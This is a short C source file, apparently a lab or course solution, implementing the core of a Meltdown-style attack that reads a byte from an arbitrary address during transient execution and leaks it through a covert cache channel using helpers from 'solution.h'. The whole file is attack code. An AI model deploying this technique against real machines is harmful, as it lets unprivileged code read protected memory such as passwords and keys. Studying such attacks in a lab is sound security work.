#include <stdint.h>
#include <x86intrin.h>

#include "solution.h"

void meltdown(uintptr_t adrs) {
    volatile int tmp = 0;
    cc_setup();
    _mm_lfence();
    tmp += 17;
    tmp *= 59;
    tmp |= 73;
    tmp /= 123;
    asm volatile("" ::: "memory");
    uint8_t rv = *((uint8_t *)adrs);
    cc_transmit(rv);
}
